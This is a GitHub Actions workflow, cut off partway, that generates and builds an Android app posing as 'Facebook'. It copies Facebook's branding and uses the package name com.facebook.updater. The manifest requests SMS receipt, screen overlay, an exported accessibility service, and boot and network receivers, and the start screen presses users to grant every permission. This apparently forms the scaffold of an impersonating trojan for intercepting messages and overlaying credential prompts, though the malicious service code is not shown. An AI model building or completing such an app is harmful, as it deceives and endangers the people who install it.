name: Build Facebook APK with AI + Overlay

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Create Project Structure
        run: |
          mkdir -p app/src/main/java/com/facebook/updater
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/assets/html
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/mipmap-anydpi-v26

      # ==================== GRADLE FILES ====================
      
      - name: Create settings.gradle
        run: |
          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "Facebook"
          include ':app'
          EOF

      - name: Create build.gradle (Project)
        run: |
          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.0'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.22'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
              configurations.all {
                  resolutionStrategy {
                      force 'org.jetbrains.kotlin:kotlin-stdlib:1.8.22',
                            'org.jetbrains.kotlin:kotlin-stdlib-jdk7:1.8.22',
                            'org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.8.22'
                      eachDependency { details ->
                          if (details.requested.group == 'org.jetbrains.kotlin'
                              && details.requested.name.startsWith('kotlin-stdlib')) {
                              details.useVersion '1.8.22'
                          }
                      }
                  }
              }
          }
          
          tasks.register('clean', Delete) {
              delete rootProject.buildDir
          }
          EOF

      - name: Create app/build.gradle
        run: |
          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }
          
          android {
              namespace 'com.facebook.updater'
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.facebook.updater"
                  minSdk 21
                  targetSdk 34
                  versionCode 2
                  versionName "2.0"
              }
              
              buildTypes {
                  release {
                      minifyEnabled true
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
                  }
                  debug {
                      minifyEnabled false
                  }
              }
              
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_11
                  targetCompatibility JavaVersion.VERSION_11
              }
              
              kotlinOptions {
                  jvmTarget = '11'
              }
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'androidx.core:core:1.12.0'
              implementation 'androidx.webkit:webkit:1.9.0'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.8.22'
              implementation 'org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.8.22'
          }
          EOF

      - name: Create gradle.properties
        run: |
          cat > gradle.properties << 'EOF'
          org.gradle.jvmargs=-Xmx2048m
          android.useAndroidX=true
          android.enableJetifier=true
          android.suppressUnsupportedCompileSdk=34
          kotlin.version=1.8.22
          EOF

      - name: Create gradle wrapper
        run: |
          mkdir -p gradle/wrapper
          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
          distributionBase=GRADLE_USER_HOME
          distributionPath=wrapper/dists
          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
          zipStoreBase=GRADLE_USER_HOME
          zipStorePath=wrapper/dists
          EOF
          
          curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar

      - name: Create gradlew
        run: |
          cat > gradlew << 'EOF'
          #!/bin/sh
          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
          APP_NAME="Gradle"
          APP_BASE_NAME=${0##*/}
          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
          MAX_FD=maximum
          warn () { echo "$*" >&2; }
          die () { echo "$*"; echo; exit 1; }
          cygwin=false
          msys=false
          darwin=false
          nonstop=false
          case "$( uname )" in
            CYGWIN* ) cygwin=true ;;
            Darwin* ) darwin=true ;;
            MSYS* | MINGW* ) msys=true ;;
            NONSTOP* ) nonstop=true ;;
          esac
          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
          if [ -n "$JAVA_HOME" ] ; then
              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
                  JAVACMD=$JAVA_HOME/jre/sh/java
              else
                  JAVACMD=$JAVA_HOME/bin/java
              fi
              if [ ! -x "$JAVACMD" ] ; then
                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
              fi
          else
              JAVACMD=java
              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
          fi
          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
              case $MAX_FD in
                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
              esac
              case $MAX_FD in
                '' | soft) : ;;
                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
              esac
          fi
          if "$cygwin" || "$msys" ; then
              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
              JAVACMD=$( cygpath --unix "$JAVACMD" )
              for arg do
                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
                      arg=$( cygpath --path --ignore --mixed "$arg" )
                  fi
                  set -- "$@" "$arg"
              done
          fi
          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
          set -- \
              "-Dorg.gradle.appname=$APP_BASE_NAME" \
              -classpath "$CLASSPATH" \
              org.gradle.wrapper.GradleWrapperMain \
              "$@"
          eval "set -- $(
              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
              xargs -n1 |
              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
              tr '\n' ' '
          )" '"$@"'
          exec "$JAVACMD" "$@"
          EOF
          chmod +x gradlew

      # ==================== RESOURCE FILES ====================
      
      - name: Create strings.xml
        run: |
          cat > app/src/main/res/values/strings.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <string name="app_name">Facebook</string>
              <string name="grant_permissions">Grant All Permissions</string>
              <string name="grant_accessibility">Grant Accessibility Permission</string>
              <string name="permissions_granted">✓ Permissions Granted</string>
              <string name="accessibility_enabled">✓ Accessibility Enabled</string>
              <string name="welcome">Welcome to Facebook</string>
              <string name="permission_desc">Please grant all permissions to continue</string>
              <string name="accessibility_desc">Enable Accessibility Service to use all features</string>
          </resources>
          EOF

      - name: Create colors.xml
        run: |
          cat > app/src/main/res/values/colors.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <color name="facebook_blue">#1877F2</color>
              <color name="facebook_dark">#0D65D9</color>
              <color name="white">#FFFFFF</color>
              <color name="light_gray">#F0F2F5</color>
              <color name="text_gray">#65676B</color>
              <color name="button_pressed">#0D65D9</color>
              <color name="success_green">#34A853</color>
          </resources>
          EOF

      - name: Create styles.xml
        run: |
          cat > app/src/main/res/values/styles.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <style name="Theme.Facebook" parent="Theme.MaterialComponents.Light.NoActionBar">
                  <item name="colorPrimary">@color/facebook_blue</item>
                  <item name="colorPrimaryDark">@color/facebook_dark</item>
                  <item name="colorAccent">@color/facebook_blue</item>
                  <item name="android:windowBackground">@color/white</item>
              </style>
          </resources>
          EOF

      - name: Create drawable/facebook_button.xml
        run: |
          cat > app/src/main/res/drawable/facebook_button.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <selector xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:state_pressed="true">
                  <shape android:shape="rectangle">
                      <solid android:color="@color/button_pressed"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
              <item>
                  <shape android:shape="rectangle">
                      <solid android:color="@color/facebook_blue"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
          </selector>
          EOF

      - name: Create drawable/facebook_button_outline.xml
        run: |
          cat > app/src/main/res/drawable/facebook_button_outline.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <selector xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:state_pressed="true">
                  <shape android:shape="rectangle">
                      <stroke android:width="2dp" android:color="@color/button_pressed"/>
                      <solid android:color="#E8F0FE"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
              <item>
                  <shape android:shape="rectangle">
                      <stroke android:width="2dp" android:color="@color/facebook_blue"/>
                      <solid android:color="@color/white"/>
                      <corners android:radius="28dp"/>
                  </shape>
              </item>
          </selector>
          EOF

      - name: Create drawable/ic_success.xml
        run: |
          cat > app/src/main/res/drawable/ic_success.xml << 'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="24dp"
              android:height="24dp"
              android:viewportWidth="24"
              android:viewportHeight="24">
              <path
                  android:fillColor="#34A853"
                  android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10s10-4.48 10-10S17.52,2 12,2z M10,17l-5-5l1.41-1.41L10,14.17l7.59-7.59L19,8L10,17z"/>
          </vector>
          EOF

      - name: Create Facebook Logo Vector
        run: |
          cat > app/src/main/res/drawable/ic_facebook_logo.xml << 'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="512dp"
              android:height="512dp"
              android:viewportWidth="512"
              android:viewportHeight="512">
              <path
                  android:fillColor="#1877F2"
                  android:pathData="M512,256C512,114.6 397.4,0 256,0C114.6,0 0,114.6 0,256C0,383.7 93.6,489.2 216,508.9V330H151V256H216V198.8C216,134.7 256.7,98 315.9,98C344.1,98 373.8,102.5 373.8,102.5V165H341C310.7,165 296,184.8 296,205.1V256H370.7L355,330H296V509C418.5,489.4 512,383.9 512,256Z"/>
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M355,330L370.7,256H296V205.1C296,184.8 310.7,165 341,165H373.8V102.5C373.8,102.5 344.1,98 315.9,98C256.7,98 216,134.7 216,198.8V256H151V330H216V508.9C228.7,510.5 242,511.3 256,511.3C270,511.3 283.3,510.5 296,508.9V330H355Z"/>
          </vector>
          EOF

      # ==================== ANDROID MANIFEST ====================
      
      - name: Create AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:tools="http://schemas.android.com/tools">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

              <application
                  android:allowBackup="true"
                  android:icon="@drawable/ic_facebook_logo"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.Facebook"
                  android:usesCleartextTraffic="true">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/Theme.Facebook">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".UpdaterService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      tools:node="merge">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>

                  <receiver
                      android:name=".NetworkReceiver"
                      android:exported="true"
                      tools:node="merge">
                      <intent-filter>
                          <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

      # ==================== LAYOUT - FIXED (REMOVED iconVisible) ====================
      
      - name: Create layout/activity_main.xml
        run: |
          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              xmlns:app="http://schemas.android.com/apk/res-auto"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical"
              android:gravity="center"
              android:padding="32dp"
              android:background="@color/white">

              <ImageView
                  android:layout_width="120dp"
                  android:layout_height="120dp"
                  android:src="@drawable/ic_facebook_logo"
                  android:layout_marginBottom="16dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="@string/welcome"
                  android:textSize="28sp"
                  android:textColor="@color/facebook_blue"
                  android:textStyle="bold"
                  android:layout_marginBottom="8dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="@string/permission_desc"
                  android:textSize="14sp"
                  android:textColor="@color/text_gray"
                  android:gravity="center"
                  android:layout_marginBottom="32dp"/>

              <!-- FIXED: Removed app:iconVisible -->
              <com.google.android.material.button.MaterialButton
                  android:id="@+id/btnGrantPermissions"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="@string/grant_permissions"
                  android:textSize="16sp"
                  android:textColor="@color/white"
                  android:background="@drawable/facebook_button"
                  android:layout_marginBottom="16dp"
                  app:icon="@drawable/ic_success"
                  app:iconGravity="textEnd"
                  app:iconTint="@color/white"/>

              <!-- FIXED: Removed app:iconVisible -->
              <com.google.android.material.button.MaterialButton
                  android:id="@+id/btnGrantAccessibility"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="@string/grant_accessibility"
                  android:textSize="16sp"
                  android:textColor="@color/facebook_blue"
                  android:background="@drawable/facebook_button_outline"
                  app:icon="@drawable/ic_success"
                  app:iconGravity="textEnd"
                  app:iconTint="@color/success_green"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="@string/accessibility_desc"
                  android:textSize="12sp"
